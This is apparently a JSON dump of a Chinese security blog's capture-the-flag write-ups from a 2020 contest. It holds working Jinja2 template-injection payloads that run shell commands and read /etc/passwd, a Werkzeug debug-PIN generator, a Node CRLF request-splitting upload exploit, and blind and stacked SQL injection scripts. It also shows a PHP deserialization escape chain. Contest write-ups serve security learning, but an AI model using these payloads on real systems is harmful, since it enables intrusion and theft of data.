1&#123;&#123;&quot;&quot;[&quot;\\x5f\\x5fclass\\x5f\\x5f&quot;][&quot;\\x5f\\x5fmro\\x5f\\x5f&quot;][1][&quot;\\x5f\\x5fsubclasses\\x5f\\x5f&quot;]()[30][&quot;\\x5f\\x5finit\\x5f\\x5f&quot;][&quot;\\x5f\\x5fglobals\\x5f\\x5f&quot;][&quot;\\x5f\\x5fbuiltins\\x5f\\x5f&quot;][&#39;\\x5f\\x5fimport\\x5f\\x5f&#39;](&#39;os&#39;)[&quot;popen&quot;](&#39;cat%20&#x2F;flag*&#39;)[&#39;read&#39;]()&#125;&#125; payload2，利用request 1&#123;&#123;()|attr(request[&#39;args&#39;][&#39;x1&#39;])|attr(request[&#39;args&#39;][&#39;x2&#39;])|attr(request[&#39;args&#39;][&#39;x3&#39;])()|attr(request[&#39;args&#39;][&#39;x4&#39;])(233)|attr(request[&#39;args&#39;][&#39;x5&#39;])|attr(request[&#39;args&#39;][&#39;x6&#39;])|attr(request[&#39;args&#39;][&#39;x4&#39;])(request[&#39;args&#39;][&#39;x7&#39;])|attr(request[&#39;args&#39;][&#39;x4&#39;])(request[&#39;args&#39;][&#39;x8&#39;])(request[&#39;args&#39;][&#39;x9&#39;])&#125;&#125;?x1&#x3D;__class__&amp;x2&#x3D;__base__&amp;x3&#x3D;__subclasses__&amp;x4&#x3D;__getitem__&amp;x5&#x3D;__init__&amp;x6&#x3D;__globals__&amp;x7&#x3D;__builtins__&amp;x8&#x3D;eval&amp;x9&#x3D;__import__(&quot;os&quot;).popen(&#39;想要执行的命令&#39;).read() 这里突然意识到文章前面都没有提到过滤器，而在模版引擎中过滤器也有很多szs 12345#比如flag被过滤，|reverse&#39;&#39;.__class__.__mro__[-1].__subclasses__()[40](&#39;galf&#39;|reverse).read()#比如getattr被过滤，|attr(&#39;&#39;|attr(&#39;__class__&#39;)).__mro__[-1].__subclasses__()[127].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)#names|last，取序列最后一个元素等等 =======================分割线 参考链接： http://n3k0.icu/2018/09/10/Python-Sandbox-Excape/ https://lihuaiqiu.github.io/2019/07/07/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-Jinja2/#more","categories":[],"tags":[{"name":"SSTI","slug":"SSTI","permalink":"https://glotozz.github.io/tags/SSTI/"}]},{"title":"2020新春战疫-网络安全公益赛-3","slug":"2020新春战疫-网络安全公益赛-3","date":"2020-02-23T02:38:33.000Z","updated":"2020-02-27T10:45:48.427Z","comments":true,"path":"2020/02/23/2020新春战疫-网络安全公益赛-3/","link":"","permalink":"https://glotozz.github.io/2020/02/23/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B-3/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 Flaskapp node_game ezExpress easy_thinking Flaskapphint中提示PIN，那么估计利用debug https://xz.aliyun.com/t/2553?tdsourcetag=s_pctim_aiomsg /debug得到源码 读取配置利用自带的/encode，然后传入/decode 1&lt;Config &#123;&#39;ENV&#39;: &#39;production&#39;, &#39;DEBUG&#39;: True, &#39;TESTING&#39;: False, &#39;PROPAGATE_EXCEPTIONS&#39;: None, &#39;PRESERVE_CONTEXT_ON_EXCEPTION&#39;: None, &#39;SECRET_KEY&#39;: &#39;s_e_c_r_e_t_k_e_y&#39;, &#39;PERMANENT_SESSION_LIFETIME&#39;: datetime.timedelta(days&#x3D;31), &#39;USE_X_SENDFILE&#39;: False, &#39;SERVER_NAME&#39;: None, &#39;APPLICATION_ROOT&#39;: &#39;&#x2F;&#39;, &#39;SESSION_COOKIE_NAME&#39;: &#39;session&#39;, &#39;SESSION_COOKIE_DOMAIN&#39;: False, &#39;SESSION_COOKIE_PATH&#39;: None, &#39;SESSION_COOKIE_HTTPONLY&#39;: True, &#39;SESSION_COOKIE_SECURE&#39;: False, &#39;SESSION_COOKIE_SAMESITE&#39;: None, &#39;SESSION_REFRESH_EACH_REQUEST&#39;: True, &#39;MAX_CONTENT_LENGTH&#39;: None, &#39;SEND_FILE_MAX_AGE_DEFAULT&#39;: datetime.timedelta(seconds&#x3D;43200), &#39;TRAP_BAD_REQUEST_ERRORS&#39;: None, &#39;TRAP_HTTP_EXCEPTIONS&#39;: False, &#39;EXPLAIN_TEMPLATE_LOADING&#39;: False, &#39;PREFERRED_URL_SCHEME&#39;: &#39;http&#39;, &#39;JSON_AS_ASCII&#39;: True, &#39;JSON_SORT_KEYS&#39;: True, &#39;JSONIFY_PRETTYPRINT_REGULAR&#39;: False, &#39;JSONIFY_MIMETYPE&#39;: &#39;application&#x2F;json&#39;, &#39;TEMPLATES_AUTO_RELOAD&#39;: None, &#39;MAX_COOKIE_SIZE&#39;: 4093, &#39;BOOTSTRAP_USE_MINIFIED&#39;: True, &#39;BOOTSTRAP_CDN_FORCE_SSL&#39;: False, &#39;BOOTSTRAP_QUERYSTRING_REVVING&#39;: True, &#39;BOOTSTRAP_SERVE_LOCAL&#39;: False, &#39;BOOTSTRAP_LOCAL_SUBDOMAIN&#39;: None&#125;&gt; 还是得生成PIN，需要读取一些配置文件 https://www.cnblogs.com/-qing-/p/11656544.html#_label2 payload 文件读取 1&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#39;open&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read()&#125;&#125; 命令执行 123&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__(&#39;__global&#39;+&#39;s__&#39;)[&#39;os&#39;].__dict__[&#39;system&#39;](&#39;ls&#39;)&#125;&#125; 都被waf 查看网卡 1&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#39;open&#39;](&#39;&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address&#39;).read()&#125;&#125; 得到02:42:ac:12:00:02=&gt;2485377957890 在docker中，查看机器码 1&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#39;open&#39;](&#39;&#x2F;proc&#x2F;self&#x2F;cgroup&#39;).read()&#125;&#125; c87691dcb0dbd614f719b6a06e7b60484b5a760147a8f5332511356483a20df4 1234567891011probably_public_bits = [ 'flaskweb', # username 'flask.app', # modname 'Flask', # getattr(app, '__name__', getattr(app.__class__, '__name__')) '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),]private_bits = [ '2485377957890',# str(uuid.getnode()), /sys/class/net/ens33/address 'c87691dcb0dbd614f719b6a06e7b60484b5a760147a8f5332511356483a20df4'# get_machine_id(), /etc/machine-id] 1234567891011121314151617181920212223242526272829303132333435363738394041import hashlibfrom itertools import chainprobably_public_bits = [ 'flaskweb', # username 'flask.app', # modname 'Flask', # getattr(app, '__name__', getattr(app.__class__, '__name__')) '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),]private_bits = [ '2485377957890',# str(uuid.getnode()), /sys/class/net/ens33/address 'c13c64207f09e3ab65ae5495988d6880e7068f245add3303fd80303ad9fce46f'# get_machine_id(), /etc/machine-id]h = hashlib.md5()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit)h.update(b'cookiesalt')cookie_name = '__wzd' + h.hexdigest()[:20]num = Noneif num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9]rv =Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = numprint(rv) 1os.popen(&#39;ls &#x2F;&#39;).read() 翔哥的方法：直接绕waf命令执行 1&#123;&#123;[].__class__.__base__.__subclasses__()[127].__init__.__globals__[&#39;sys&#39;+&#39;tem&#39;](&#39;ls &#x2F;&#39;)&#125;&#125; 没有回显，反弹shell即可 node_game https://r3billions.com/writeup-split-second/?tdsourcetag=s_pctim_aiomsg 1%C4%A0HTTP%2F1.1%C4%8D%C4%8AHost%3A%C4%A0127.0.0.1%C4%8D%C4%8A%C4%8D%C4%8AGET%C4%A0%2Ffile_upload 本地测一下 123456#使用npm 安装一个模块 n 到全局npm install -g n#使用 n 加版本号就可以安装其他版本n 8.12.0#再使用 n ，通过上下键，就可以选择不同的版本n wireshark里面是这样的 也就是说payload有问题，并没有实现CRLF注入，但是不知道哪有问题。。 Express文件上传，查看参数内容，等下构造包的时候方便些 123var file_path &#x3D; &#39;&#x2F;uploads&#x2F;&#39; + req.files[0].mimetype +&quot;&#x2F;&quot;;var file_name &#x3D; req.files[0].originalnamevar dir_file &#x3D; __dirname + file_path + file_name 作罢 ======================分割线 赵师傅发了脚本，CRLF的编码和wp不太一样 原理： https://xz.aliyun.com/t/2894 在nodejs8.12.0这个版本中, 程序在底层处理的时候会舍弃高位的字符, 只保留低位的字符, 也就是说 假如我们传入chr(0xffa0)处理后会被截断为chr(0xa0)，并且这个0xff可更换 测试CRLF 1234567891011121314import urllibimport requestspayload = ''' HTTP/1.1Host: xConnection: keep-aliveGET /file_upload HTTP/1.1Host: xConnection: closex:'''payload = payload.replace(\"\\n\", \"\\r\\n\")a = ''.join(chr(int('0xff' + hex(ord(c))[2:].zfill(2), 16))for c in payload)a = urllib.parse.quote(a)print(a) 但是打题目和本地还是失败，依旧是304，我丢，再用脚本发包发现可以，猜测原因可能是bp发送GET请求中有这些非可见字符的时候可能会出错 返回200，返回源码 既然CSRF注入成功，配合SSRF上传文件 之前看源码发现我们可控文件路径，但是还需要访问 123456789app.get(&#39;&#x2F;&#39;, function(req, res) &#123; var action &#x3D; req.query.action?req.query.action:&quot;index&quot;; if( action.includes(&quot;&#x2F;&quot;) || action.includes(&quot;\\\\&quot;) )&#123; res.send(&quot;Errrrr, You have been Blocked&quot;); &#125; file &#x3D; path.join(__dirname + &#39;&#x2F;template&#x2F;&#39;+ action +&#39;.pug&#39;); var html &#x3D; pug.renderFile(file); res.send(html);&#125;); 上传a.pug到/template下即可 pug语法： https://segmentfault.com/a/1190000006198621 12345doctype htmlhtml head body include ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag.txt 修改源码把ip限制去掉抓包 123456789101112131415161718POST &#x2F;file_upload HTTP&#x2F;1.1Host: 192.168.56.124:8081User-Agent: x Content-Type: multipart&#x2F;form-data; boundary&#x3D;---------------------------2995119424827Connection: keep-aliveContent-Length: 269-----------------------------2995119424827Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;a.pug&quot;Content-Type: &#x2F;..&#x2F;templatedoctype htmlhtml head body include ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag.txt-----------------------------2995119424827-- 结合CRLF 123456789101112131415161718192021222324252627payload &#x3D; &#39;&#39;&#39; HTTP&#x2F;1.1Host: xConnection: keep-alivePOST &#x2F;file_upload HTTP&#x2F;1.1Host: 192.168.56.124:8081User-Agent: x Content-Type: multipart&#x2F;form-data; boundary&#x3D;---------------------------2995119424827Connection: keep-aliveContent-Length: 269-----------------------------2995119424827Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;a.pug&quot;Content-Type: &#x2F;..&#x2F;templatedoctype htmlhtml head body include ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag.txt-----------------------------2995119424827--GET &#x2F;file_upload HTTP&#x2F;1.1Host: xConnection: closex:&#39;&#39;&#39; 最后访问 这里发包格式还是挺细的，可以通过wireshark分析排查，比如一开始我出现过下面的解析错误 ezExpress明显的JavaScript原型链污染 留下了不学无术的眼泪.jpg =================分割线 JavaScript原型链污染： https://glotozz.github.io/2020/02/25/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/ easy_thinking应该是tp框架，提示Vulnerability Search，可能是搜索功能有问题 产生报错 tp6.0，应该会给源码，扫了下，发现www.zip https://paper.seebug.org/1114/ 猜测是搜索记录是data，sessionid是文件名，想本地测试下，发现运行报错 [Sun Feb 23 06:18:54 2020] PHP Warning: require(/root/Desktop/web/public/vendor/autoload.php): failed to open stream: No such file or directory in /root/Desktop/web/public/index.php on line 6 对照tp6文件，先将index.php移到public中，再修改 require __DIR__ . &#39;/../vendor/autoload.php&#39;; 又报错 模板文件不存在:public/static/tamplate/index\\index.html 但是明明路径没错，查看配置 config/view.php修改view_dir_name为public 修改app/home/config/view.php为static/tamplate/ 总算能用了。。 在登录的时候设置session的时候修改sessionid，在查询的时候用这个sessionid即可添加任意内容 但是这样访问不到，需要写入app/home/controller/a.php下， 构造../../../../app/home/controller/a.php 长度37 也没有文件包含的地方。。遂作罢 正解就是题目环境直接访问就行。。 因为我本地修改了一些配置导致无法访问。。但是不改调试不了。。 最后还需要bypassdisable_func，需要执行/readflag 这个做过几次，过滤了很多，包括mail()等 https://github.com/mm0r1/exploits","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"2020新春战疫-网络安全公益赛-2","slug":"2020新春战疫-网络安全公益赛-2","date":"2020-02-22T14:56:52.000Z","updated":"2020-02-27T10:48:03.663Z","comments":true,"path":"2020/02/22/2020新春战疫-网络安全公益赛-2/","link":"","permalink":"https://glotozz.github.io/2020/02/22/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B-2/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 easysqli_copy blacklist Ezsqli 放上我xxxxx easysqli_copy看到PDO+set names gbk 就想到宽字节注入，之前看过的文章 从宽字节注入认识PDO的原理和正确使用：https://www.freebuf.com/articles/web/216336.html 简单测试了下，发现可以，但是过滤了select，我简单测试了下发现存在堆叠注入，没有过滤=，万事大吉 1234select hex(&#39;select sleep(5)&#39;);set @a&#x3D;0x73656C65637420736C656570283529;prepare smtm_test from @a;execute smtm_test; 1?id&#x3D;1%df&#39;;set%20@a&#x3D;0x73656C65637420736C656570283529;prepare%20smtm_test%20from%20@a;execute%20smtm_test; 脚本 12345678910111213141516171819202122232425262728293031323334353637383940#!/usr/bin/env python2# coding=utf-8import urllibimport requestsurl = \"http://d157325460674375820d1c51bd80f6adc9672fe83ab44e0e.changame.ichunqiu.com/?id=\"headers = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0',&#125;flag = \"\"tmp = 0for i in range(1, 100): if tmp == 1: break tmp = 1 for j in range(32, 127): # payload = \"select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())\" # payload = \"select(group_concat(column_name))from(information_schema.columns)where(table_name='table1')\" payload = \"select(group_concat(fllllll4g))from(table1)\" payload = \"select if(ascii(substr((&#123;&#125;),&#123;&#125;,1))=&#123;&#125;,sleep(3),1)\".format(payload, i, j) # print payload payload = payload.encode('hex') param = \"1\"+urllib.unquote(\"%df\")+\"';set @a=0x&#123;&#125;;prepare smtm_test from @a;execute smtm_test;\".format(payload) param = urllib.quote(param) # print(param) try: url1 = url + param r = requests.get(url=url1, timeout=3) if r.status_code != 200: j -= 1 continue # print(r.content.decode('utf-8')) except requests.exceptions.ReadTimeout as e: tmp = 0 flag = flag + chr(j) print(flag) breakprint(flag) blacklist1return preg_match(&quot;&#x2F;set|prepare|alter|rename|select|update|delete|drop|insert|where|\\.&#x2F;i&quot;,$inject); emm，这个黑名单似乎可以用昨天的exp打。。。 1inject&#x3D;1&#39;and if(database() regexp&quot;^s&quot;,sleep(3),1)%23 需要先利用堆叠注入查询表和字段 11&#39;;show tables;# 得到FlagHere 11&#39;; show columns from &#96;FlagHere&#96;; # 得到flag 1&#39;and if((FlagHere.flag regexp&#39;^{}&#39;),sleep(5),1)%23 还有个问题，就是利用昨天的方法只能查当前表，而flag在另一张表中。 遂作罢 https://www.4hou.com/posts/mM60 骚操作：handler 12345678910HANDLER tbl_name OPEN [ [AS] alias] HANDLER tbl_name READ index_name &#123; &#x3D; | &lt;&#x3D; | &gt;&#x3D; | &lt; | &gt; &#125; (value1,value2,...) [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125; [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name READ &#123; FIRST | NEXT &#125; [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name CLOSE 11&#39;;handler FlagHere open as a;handler a READ first;# 得到flag Ezsqlibp跑一下sql字典 不是200就是500,500的是语法错误，其实过滤字符的并不多 数字型，有回显考虑盲注，简单构造了下成了 bp跑一下发现c的时候Hello Nu1L 数据库为ctf,mysql版本为5.7.1 发现innodb也被过滤。。 聊一聊bypass information_schema：https://www.anquanke.com/post/id/193512 前提要是mysql ≥ 5.7版本 新特性sys.schema_auto_increment_columns也被过滤。。 1select table_name from sys.schema_auto_increment_columns where table_schema&#x3D;&#39;ctf&#39; 还有另一种 1sys.schema_table_statistics_with_buffer 1select group_concat(table_name) from sys.x$schema_table_statistics_with_buffer 成功得到了表名users233333333333333,f1ag_1s_h3r3_hhhhh, 1select * from f1ag_1s_h3r3_hhhhh 报500错误，说明不止1列。。。猜了几个字段也不行==！无列名注入实在搞不出来。。 正解 1(select 1,0x61)&gt;(select * from f1ag_1s_h3r3_hhhhh limit 1) 脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#!/usr/bin/env python2# coding=utf-8import requestss = requests.session()url = \"http://f1378e453faf447696702f67444c2575579c8764a54a4e37.changame.ichunqiu.com/\"headers = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0'&#125;cookies = &#123;&#125;data = &#123;&#125;flag = \"\"tmp = 0# for i in range(1, 100):# if tmp == 1:# break# tmp = 1# for j in range(32, 127):# # payload = \"select version()\"# payload = \"select group_concat(table_name) from sys.x$schema_table_statistics_with_buffer\"# param = \"0^(ascii(substr((&#123;&#125;),&#123;&#125;,1))=&#123;&#125;)#\".format(payload, str(i), str(j))# print(param)# data = &#123;# 'id': param# &#125;# r = requests.post(url=url, headers=headers, data=data)# # print(r.content.decode('utf-8'))# if \"Nu1L\" in r.content.decode(\"utf-8\"):# tmp = 0# flag = flag + chr(j)# print(flag)# break# print(flag)flag = ''for i in range(1,100): for j in range(32,127): # param = \"0^((select 1,0x&#123;&#125;)&gt;(select * from f1ag_1s_h3r3_hhhhh limit 1))#\".format((flag + chr(j)).encode('hex')) param = \"0^((select 1,concat('&#123;&#125;', CAST('0' as json)))&gt;(select * from f1ag_1s_h3r3_hhhhh limit 1))#\".format(flag + chr(j)) # print param data = &#123; 'id': param &#125; r = requests.post(url=url, headers=headers, data=data) if \"Nu1L\" in r.content.decode(\"utf-8\"): tmp = 0 flag = flag + chr(j-1) print(flag) break print(flag) 有个缺陷，就是不区分大小写。。 https://www.smi1e.top/%e6%96%b0%e6%98%a5%e6%88%98%e7%96%ab%e5%85%ac%e7%9b%8a%e8%b5%9b-ezsqli-%e5%87%ba%e9%a2%98%e5%b0%8f%e8%ae%b0/?tdsourcetag=s_pctim_aiomsg 预期解是文章中提到的使用 SELECT CONCAT(&quot;A&quot;, CAST(0 AS JSON)) 来另其返回二进制字符串，从而区分大小写。 测试了一下 SELECT CONCAT(&quot;A&quot;, CAST(0 AS JSON)) 需要mysql&gt;=5.7 对于sys.x$schema_table_statistics_with_buffer是视图，所以一开始本地没找到==！ 视图是在基本表之上建立的表，它的结构（即所定义的列）和内容（即所有记录）都来自基本表，它依据基本表存在而存在。一个视图可以对应一个基本表，也可以对应多个基本表。视图是基本表的抽象和在逻辑意义上建立的新关系。","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"2020新春战疫-网络安全公益赛-1","slug":"2020新春战疫-网络安全公益赛-1","date":"2020-02-22T07:05:27.000Z","updated":"2020-02-27T10:46:57.992Z","comments":true,"path":"2020/02/22/2020新春战疫-网络安全公益赛-1/","link":"","permalink":"https://glotozz.github.io/2020/02/22/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B-1/","excerpt":"最近做啥都没耐心==！","text":"最近做啥都没耐心==！ &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 盲注 第一种，不用select（只能查当前表） 第二种，利用堆叠注入，16进制+mysql预处理 babyphp 参考链接: 盲注给了源码，简单测一下过滤内容 select被过滤！！以及= like等，可用regexp 没有回显考虑时间盲注。select被过滤，我通常两种办法， 第一种，不用select（只能查当前表）11 and if(1,sleep(5),1) 成功延时 121 and if(database() regexp(&#39;^&#39;))1 and if((flllllllag.fl4g regexp&quot;^f&quot;),sleep(5),1) 一开始不知道为啥跑到flag{就断了，索性加个hex()，就好了 1234567891011121314151617181920212223242526272829303132333435#!/usr/bin/env python2# coding=utf-8import stringimport requestsurl = \"http://de1da794b0d046e6abd2bf3f1a1c8f8d25930eca82df4eb4.changame.ichunqiu.com/?id=\"headers = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0'&#125;easy_string = string.digits + string.ascii_letters# print easy_stringflag = \"\"tmp = 0flag = ''for i in range(1, 100): if tmp == 1: break tmp = 1 for j in easy_string: param = '2 or if((hex(flllllllag.fl4g) regexp\"^&#123;&#125;\"),sleep(5),1)'.format(flag+j) # print param try: url1 = url + param r = requests.get(url=url1, headers=headers, timeout=3) # if r.status_code != 200: # j -= 1 # continue # print(r.content.decode('utf-8')) except requests.exceptions.ReadTimeout as e: tmp = 0 flag = flag + j print(flag) breakprint(flag) 第二种，利用堆叠注入，16进制+mysql预处理 堆叠注入： https://www.jianshu.com/p/36f0772f5ce8 先判断能否堆叠注入，既然不能用select，用show代替 11;show tables;# 发现没有报500，应该可以堆叠注入 3种payload 1PREPARE jwt from concat(char(115,101,108,101,99,116), &#39; * from &#96;1919810931114514&#96; &#39;);EXECUTE jwt;# 1SET @sql&#x3D;concat(char(115,101,108,101,99,116),&#39;* from &#96;1919810931114514&#96;&#39;);PREPARE jwt from @sql;EXECUTE jwt;# 1PREPARE jwt from concat(&#39;s&#39;,&#39;elect&#39;, &#39; * from &#96;1919810931114514&#96; &#39;);EXECUTE jwt;# 但是我本地测试时只有第二个能执行，而第二个恰恰使用了= 猜测是版本问题，先去看了原题 简单来说，MariaDB是MySQL源代码的一个分支 , MariaDB包括的一些新特性使它优于MySQL。 MariaDB跟MySQL在绝大多数方面是兼容的，对于开发者来说，几乎感觉不到任何不同。 然后我把本地mysql版本切到mysql8.0.12，已选择执行是正常的，整个执行还是一样不行 想直接在题目上打一打试试，发现环境已经关了，遂作罢 babyphpwww.zip源码泄露，代码审计，思路很明确， 1234if($_SESSION[&#39;login&#39;]&#x3D;&#x3D;&#x3D;1)&#123; require_once(&quot;flag.php&quot;); echo $flag;&#125; 需要成功登录admin， 寻找反序列化入口， 123456789101112public function update()&#123; $Info&#x3D;unserialize($this-&gt;getNewinfo()); $age&#x3D;$Info-&gt;age; $nickname&#x3D;$Info-&gt;nickname; $updateAction&#x3D;new UpdateHelper($_SESSION[&#39;id&#39;],$Info,&quot;update user SET age&#x3D;$age,nickname&#x3D;$nickname where id&#x3D;&quot;.$_SESSION[&#39;id&#39;]); &#x2F;&#x2F;这个功能还没有写完 先占坑&#125;public function getNewInfo()&#123; $age&#x3D;$_POST[&#39;age&#39;]; $nickname&#x3D;$_POST[&#39;nickname&#39;]; return safe(serialize(new Info($age,$nickname)));&#125; 正常情况下这里的反序列化我们只能控制Info类的两个属性，但是这里通过safe()方法可以逃逸字符，甚至还可以逃逸对象 思路一、 User-&gt;__destruct()读取flag.php 但是很快就发现行不通。首先是return，不会打印出来，其次flag被过滤替换成hacker 思路二、 注出admin密码登陆后查看 UpdateHelper类-&gt;__destruct() User类-&gt;toString() Info类-&gt;__call() dbCtrl类-&gt;login() 构造一个正常的payload，比如POST:age=&amp;nickname= 1O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:0:&quot;&quot;;s:8:&quot;nickname&quot;;s:0:&quot;&quot;;s:8:&quot;CtrlCase&quot;;N;&#125; 测试逃逸，比如逃逸出$CtrlCase的值为haha， 1O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:0:&quot;&quot;;s:8:&quot;nickname&quot;;s:0:&quot;&quot;;s:8:&quot;CtrlCase&quot;;s:4:&quot;haha&quot;;&#125; paylaod 1&quot;;s:8:&quot;CtrlCase&quot;;s:4:&quot;haha&quot;;&#125; 需要逃逸29个字符，&#39;-&gt;hacker逃逸5个字符,构造5个单引号和4个union POST:age=&amp;nickname=&#39;&#39;&#39;&#39;&#39;unionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;s:4:&quot;haha&quot;;} 下面是序列化内容 1O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:0:&quot;&quot;;s:8:&quot;nickname&quot;;s:55:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhacker1&quot;;s:8:&quot;CtrlCase&quot;;s:4:&quot;haha&quot;;&#125;&quot;;s:8:&quot;CtrlCase&quot;;N;&#125; 再举个逃逸对象的例子 1O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:0:&quot;&quot;;s:8:&quot;nickname&quot;;s:0:&quot;&quot;;s:8:&quot;CtrlCase&quot;;O:4:&quot;User&quot;:1:&#123;s:8:&quot;nickname&quot;;s:8:&quot;flag.php&quot;;&#125;&#125; 1&quot;;s:8:&quot;CtrlCase&quot;;O:4:&quot;User&quot;:1:&#123;s:8:&quot;nickname&quot;;s:8:&quot;flag.php&quot;;&#125;&#125; 63个逃逸字符-12个单引号和3个union，这里要注意的是题目中flag也被替换成hacker 在构造前分析下sql 123456789$result&#x3D;$this-&gt;mysqli-&gt;prepare($sql);$result-&gt;bind_param(&#39;s&#39;, $this-&gt;name);$result-&gt;execute();$result-&gt;bind_result($idResult, $passwordResult);$result-&gt;fetch();$result-&gt;close();if ($this-&gt;token&#x3D;&#x3D;&#39;admin&#39;) &#123; return $idResult;&#125; 返回结果集中的$idResult，查询的时候把第一个参数改为password即可 1select password,id from user where username&#x3D;? payload 12345678910111213141516171819202122232425262728293031323334&lt;?phpClass UpdateHelper&#123; public $sql;&#125;Class User&#123; public $nickname; public $age;&#125;Class Info&#123; public $age; public $CtrlCase;&#125;Class dbCtrl&#123; public $name; public $hostname=\"127.0.0.1\"; public $dbuser=\"noob123\"; public $dbpass=\"noob123\"; public $database=\"noob123\"; public $token;&#125;$d = new dbCtrl;$d-&gt;name = 'admin';$d-&gt;token = 'admin';$c = new Info;$c-&gt;CtrlCase = $d;$b = new User;$b-&gt;age = 'select password,id from user where username=?';$b-&gt;nickname = $c;$a = new UpdateHelper;$a-&gt;sql = $b;echo serialize($a);?&gt; 得到 1O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:2:&#123;s:3:&quot;age&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:6:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:7:&quot;noob123&quot;;s:6:&quot;dbpass&quot;;s:7:&quot;noob123&quot;;s:8:&quot;database&quot;;s:7:&quot;noob123&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#125;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username&#x3D;?&quot;;&#125;&#125; 满足格式 1&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:2:&#123;s:3:&quot;age&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:6:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:7:&quot;noob123&quot;;s:6:&quot;dbpass&quot;;s:7:&quot;noob123&quot;;s:8:&quot;database&quot;;s:7:&quot;noob123&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#125;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username&#x3D;?&quot;;&#125;&#125;&#125; 365位，73个单引号 